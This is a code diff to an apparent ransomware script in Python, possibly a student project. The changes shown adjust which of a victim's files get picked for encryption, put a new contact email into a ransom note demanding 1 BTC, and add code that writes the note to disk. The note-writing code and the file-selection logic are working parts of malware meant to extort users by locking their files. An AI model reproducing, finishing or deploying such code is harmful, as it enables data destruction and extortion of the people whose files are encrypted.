@@ -38,7 +38,7 @@ for filename in files:
         important.append(filename)
         print ("I see you have a private key, let me validate that for you...")
 
-    elif ".pem" not in filename and "HomeworkHeroes" not in filename and "send" not in filename:    #This makes sure we do not accidentally Encrypt things victim needs
+    elif ".pem" not in filename and "HomeworkHeroes" not in filename and ".sh" not in filename:    #This makes sure we do not accidentally Encrypt things victim needs
         file_list.append(filename)
 ###############################################
 
@@ -130,10 +130,14 @@ if len(important) == 0:  #if we dont see a private_key file, we want to encrypt 
     ransomNote="""
     Attention, your Personal Files have been Encrypted with a Government Grade Encryption System.
     Please send 1btc to [wallet address] along with proof of purchase. 
-    to our email workinprogress@gmail.com. Processing could take between 2 - 5 buisness days.
+    to our email paymentsRansom@gmail.com. Processing could take between 2 - 5 buisness days.
     Thank you for your understanding.
     """
     print(ransomNote)
+    with open('ransom.note', 'w') as file:
+        file.write(ransomNote)
+        file.close()
+    
     
 else:     #read the public.key, if it works, then decrypt the files
     #///###########[Decrypting Files]###########\\\#
